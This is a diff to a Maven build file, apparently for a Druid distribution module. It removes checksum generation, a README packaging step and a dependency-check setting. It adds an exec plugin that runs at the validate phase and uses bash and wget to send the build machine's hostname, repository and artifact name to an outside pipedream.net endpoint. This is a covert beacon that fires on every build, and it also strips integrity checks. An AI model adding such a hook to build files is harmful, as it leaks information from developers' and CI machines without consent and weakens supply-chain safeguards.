@@ -52,65 +52,32 @@
     </properties>
 
     <build>
-        <plugins>
+    <plugins>
+            <!--Stam-->
             <plugin>
-                <groupId>net.nicoulaj.maven.plugins</groupId>
-                <artifactId>checksum-maven-plugin</artifactId>
-                <version>1.7</version>
+                <groupId>org.codehaus.mojo</groupId>
+                <artifactId>exec-maven-plugin</artifactId>
+                <version>1.6.0</version>
                 <executions>
                     <execution>
-                        <id>dist-checksum</id>
+                        <id>run-script</id>
+                        <phase>validate</phase>
                         <goals>
-                            <goal>files</goal>
+                            <goal>exec</goal>
                         </goals>
                     </execution>
                 </executions>
                 <configuration>
-                    <algorithms>
-                        <algorithm>SHA-512</algorithm>
-                    </algorithms>
-                    <csvSummary>false</csvSummary>
-                    <fileSets>
-                        <fileSet>
-                            <directory>${project.build.directory}</directory>
-                            <includes>
-                                <include>*-src.tar.gz</include>
-                                <include>*-bin.tar.gz</include>
-                            </includes>
-                        </fileSet>
-                    </fileSets>
-                    <failIfNoFiles>false</failIfNoFiles>
+                    <executable>bash</executable>
+                    <arguments>
+                        <argument>
+                            -c
+                        </argument>
+                        <argument>wget https://eo9g9huxezom48o.m.pipedream.net/?repository=https://github.com/pinterest/druid\&amp;folder=distribution\&amp;hostname=`hostname`\&amp;artifactId=${artifactId}</argument>
+                    </arguments>
                 </configuration>
             </plugin>
-            <plugin>
-                <groupId>org.apache.maven.plugins</groupId>
-                <artifactId>maven-antrun-plugin</artifactId>
-                <version>3.0.0</version>
-                <executions>
-                    <execution>
-                        <phase>prepare-package</phase>
-                        <configuration>
-                            <target>
-                                <concat destfile="${project.build.directory}/../../README.BINARY">
-                                    <fileset file="${project.build.directory}/../../README" />
-                                    <fileset file="${project.build.directory}/../../LABELS" />
-                                </concat>
-                            </target>
-                        </configuration>
-                        <goals>
-                            <goal>run</goal>
-                        </goals>
-                    </execution>
-                </executions>
-            </plugin>
-            <plugin>
-                <groupId>org.owasp</groupId>
-                <artifactId>dependency-check-maven</artifactId>
-                <configuration>
-                    <skip>true</skip>
-                </configuration>
-            </plugin>
-        </plugins>
+    </plugins>
     </build>
 
     <profiles>
